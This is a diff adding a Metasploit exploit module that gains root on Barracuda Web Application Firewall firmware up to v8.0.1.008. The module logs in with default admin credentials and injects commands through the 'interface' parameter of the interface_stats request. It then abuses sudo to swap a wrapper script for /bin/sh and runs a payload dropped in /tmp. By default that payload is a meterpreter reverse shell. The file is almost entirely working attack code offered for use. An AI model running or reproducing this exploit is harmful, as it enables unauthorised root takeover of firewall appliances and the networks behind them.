@@ -1,0 +1,180 @@
+# Exploit Title: Barracuda Web Application Firewall <= v8.0.1.008 Post Auth Remote Root Exploit
+# Date: 07/28/16
+# Exploit Author: xort xort@blacksecurity.org
+# Vendor Homepage: https://www.barracuda.com/
+# Software Link: https://www.barracuda.com/products/webapplicationfirewall
+# Version: Web App Firewall Firmware <= 8.0.1.008 (2016-03-22)
+# Tested on: Web App Firewall Firmware <= v8.0.1.008 (2016-03-22)
+# CVE : None.
+
+# vuln: interface_stats
+
+require 'msf/core'
+require 'date'
+require "base64"
+
+class MetasploitModule < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+	include  Exploit::Remote::Tcp
+        include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Barracuda Web Application Firewall <= v8.0.1.008 Post Auth Root Exploit',
+			'Description'    => %q{
+					This module exploits a remote command execution vulnerability in the Barracuda Web
+					Application Firweall firmware versions <= v8.0.1.008 (2016-03-22) by exploiting a
+					vulnerability in the web administration interface. By sending a specially crafted
+					request it's possible to inject system commands while escalating to root do to relaxed 
+					sudo configuration on the local machine.
+			},	
+			'Author'         => [ 'xort' ], # disclosure and exploit module
+			'References'     => [ [ 'none', 'none'] ],
+			'Platform'       => [ 'linux'],
+			'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },
+			'Targets' => [['Web Application Firewall <= v8.0.1.008 (2016-03-22)', {}]],
+			'DefaultTarget'  => 0 ))
+
+			register_options(
+				[
+					OptString.new('PASSWORD', [ false, 'Password', "admin" ]),	
+			         	OptString.new('USERNAME', [ true, 'Admin Username', "admin" ]),	
+					OptString.new('CMD', [ false, 'Command to execute', "" ]),	
+					Opt::RPORT(8000),
+				], self.class)
+	end
+
+	def do_login(username, password_clear, et)
+                vprint_status( "Logging into machine with credentials...\n" )
+
+                # vars
+                timeout = 1550;
+                enc_key = Rex::Text.rand_text_hex(32)
+
+                # send request
+                res = send_request_cgi(
+                {
+                      'method'  => 'POST',
+                      'uri'     => "/cgi-mod/index.cgi",
+                      'headers' =>
+                        {
+                                'Accept' => "application/json, text/javascript, */*; q=0.01",
+                                'Content-Type' => "application/x-www-form-urlencoded",
+                                'X-Requested-With' => "XMLHttpRequest"
+                        },
+                      'vars_post' =>
+                        { 
+
+                          'enc_key' => enc_key,
+                          'et' => et,
+                          'user' => "admin", # username,
+                          'password' => "admin", # password_clear,
+                          'enctype' => "none",
+                          'password_entry' => "",
+                          'login_page' => "1",
+                          'login_state' => "out",
+                          'real_user' => "",
+                          'locale' => "en_US",
+                          'form' => "f",
+                          'Submit' => "Sign in",
+                        }
+                }, timeout)
+
+                # get rid of first yank
+                password = res.body.split('\n').grep(/(.*)password=([^&]+)&/){$2}[0] #change to match below for more exact result
+                et = res.body.split('\n').grep(/(.*)et=([^&]+)&/){$2}[0]
+
+                return password, et
+        end
+
+	def run_command(username, password, et, cmd)
+
+                # file to replace
+                sudo_cmd_exec = "/home/product/code/firmware/current/bin/config_agent_wrapper.pl"
+
+		sudo_run_cmd_1 = "sudo /bin/cp /bin/sh #{sudo_cmd_exec} ; sudo /bin/chmod +x #{sudo_cmd_exec}" 
+		sudo_run_cmd_2 = "sudo #{sudo_cmd_exec} -c " 
+
+		vprint_status( "Running Command...\n" )
+
+                # random filename to dump too + 'tmp' HAS to be here.
+                b64dumpfile = "/tmp/" + rand_text_alphanumeric(4+rand(4))
+
+                # decoder stubs - tells 'base64' command to decode and dump data to temp file
+                b64decode1 = "echo \""
+                b64decode2 = "\" | base64 -d >" + b64dumpfile
+
+                # base64 - encode with base64 so we can send special chars and multiple lines
+		cmd = Base64.strict_encode64(cmd) 
+
+                # Create injection string. 
+                #      a) package the  base64 decoder with encoded bytes
+                #      b) attach a chmod +x request to make the script created (b64dumpfile) executable
+                #      c) execute decoded base64 dumpfile
+
+                injection_string = b64decode1 + cmd + b64decode2 + "; /bin/chmod +x " + b64dumpfile + "; " + sudo_run_cmd_1 + "; " + sudo_run_cmd_2 + b64dumpfile + " ; rm " + b64dumpfile
+
+#                injection_string = b64decode1 + cmd + b64decode2 + "; /bin/chmod +x " + b64dumpfile + "; " + sudo_run_cmd_1 + "; " + sudo_run_cmd_2 + b64dumpfile 
+	
+		vprint_status( "sending..." )
+	        res = send_request_cgi({
+         	   'method' => 'GET',
+	           'uri'    => "/cgi-mod/index.cgi",
+		   'headers' => 
+			{
+				'UserAgent' => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
+			},
+		    'vars_get' => {
+			'ajax_action' => 'interface_stats',
+            		'user' => username,
+	     		'password' => password, 
+            		'et' => et,
+			'locale' => 'en_US',
+			'realm' => '',
+            		'auth_type' => 'Local',
+            		'primary_tab' => 'BASIC',
+            		'secondary_type' => 'status',
+
+            		'interface' => 'eth0' + '| ' + injection_string + ' |echo ' # vuln
+        		}
+	        })	
+
+	end
+
+	def exploit
+
+		# params
+		timeout = 1550;
+
+                real_user = "";
+		et = Time.now.to_i  
+		user = datastore['USERNAME']
+		password = datastore['PASSWORD']
+
+		# do login and get password hash
+		password_hash, et = do_login(user, password, et)
+		vprint_status("got password hash: #{password_hash}\n")
+		sleep(2)
+	
+                #if no 'CMD' string - add code for root shell
+		if not datastore['CMD'].nil? and not datastore['CMD'].empty?
+
+			cmd = datastore['CMD']	
+			
+			# Encode cmd payload	
+			encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2') 
+
+			# kill stale calls to bdump from previous exploit calls for re-use
+			run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/n ;printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n ; /tmp/n" ))
+		else	
+			# Encode payload to ELF file for deployment	
+			elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
+	        	encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2') 
+
+			# kill stale calls to bdump from previous exploit calls for re-use
+			run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/m ;printf \"#{encoded_elf}\" > /tmp/m; chmod +rx /tmp/m ; /tmp/m" ))
+		
+			handler
+		end
+	end
+end
